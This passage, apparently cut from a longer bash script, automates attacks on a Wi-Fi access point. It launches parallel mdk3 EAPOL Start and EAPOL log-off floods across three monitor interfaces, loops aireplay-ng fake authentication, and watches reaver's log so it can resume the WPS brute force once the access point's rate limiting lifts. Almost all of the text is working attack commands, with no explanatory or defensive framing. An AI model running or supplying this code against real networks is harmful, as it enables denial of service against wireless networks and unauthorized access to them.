gnome-terminal  --geometry=1x2 --title='EAPOL Start Flood Attack in progress' -e "timeout 60 mdk3 $MON1 x 0 -t $MAC -n "$ESSID" -s 200" &  gnome-terminal  --geometry=1x2 --title='EAPOL Start Flood Attack in progress' -e " timeout 60 mdk3 $MON2 x 0 -t $MAC -n "$ESSID" -s 200" &  gnome-terminal  --geometry=1x2 --title='EAPOL Start Flood Attack in progress' -e "timeout 60 mdk3 $MON3 x 0 -t $MAC -n "$ESSID" -s 200";
sleep 60;
fi
if [ "$MDK3_MAIN_MENU_OPTION" = 3 ]; then
gnome-terminal  --geometry=1x2 --title='EAPOL log off Flood Attack in progress' -e "timeout 60 mdk3 $MON1 x 1 -t $MAC  -s 200 -c $TARGET_STATION" & gnome-terminal  --geometry=1x2 --title='EAPOL log off Flood Attack in progress' -e "timeout 60 mdk3 $MON2 x 1 -t $MAC -s 200 -c $TARGET_STATION" & gnome-terminal  --geometry=1x2 --title='EAPOL log off Flood Attack in progress' -e  "timeout 60 mdk3 $MON3 x 1 -t $MAC -s 200 -c $TARGET_STATION";
sleep 60;
fi
killall -CONT reaver;
VARIABLE_CHECK_FOR_RATE_LIMITING=`tail -1 /etc/reaver_tmp.txt 2> /dev/null`
SUCCESSIVE_EAPOL_FAILURES=`tail -4 /etc/reaver_tmp.txt 2> /dev/null|grep -F '[!] WARNING: 25 successive start failures'`;
MDK3_KILLALL_1=`ps -A|grep mdk3`
done
###
VARIABLE_CHECK_FOR_RATE_LIMITING=`tail -1 /etc/reaver_tmp.txt 2> /dev/null`
SUCCESSIVE_EAPOL_FAILURES=`tail -4 /etc/reaver_tmp.txt 2> /dev/null|grep -F '[!] WARNING: 25 successive start failures'`;
if [ "$VARIABLE_CHECK_FOR_RATE_LIMITING" != "[!] WARNING: Detected AP rate limiting, waiting 10 seconds before re-checking" -o "$SUCCESSIVE_EAPOL_FAILURES" =  "[!] WARNING: 25 successive start failures" ]; then
killall mdk3 2> /dev/null
fi
done
}
###########################################################################
function TAIL {
while :; do
clear
timeout 10 tail -n 100 -f  /etc/reaver_tmp.txt 2> /dev/null;
clear
AIREPLAY_RESET=`cat '/etc/aireplay_tmp.txt'|grep -w 'Switching to shared key authentication'`
if [ -n "$AIREPLAY_RESET" ]; then
killall aireplay-ng
fi
timeout 5 tail -n 100 -f /etc/aireplay_tmp.txt 2> /dev/null
done
}
###########################################################################
function AIREPLAY {
while :; do
sleep 0.5;
aireplay-ng $MON1 -1 100000000 -a "$MAC" -e "$ESSID" -Q -q3 2> /dev/null| tee /etc/aireplay_tmp.txt > /dev/null;
done
}
###########################################################################
MDK3_MAIN_MENU


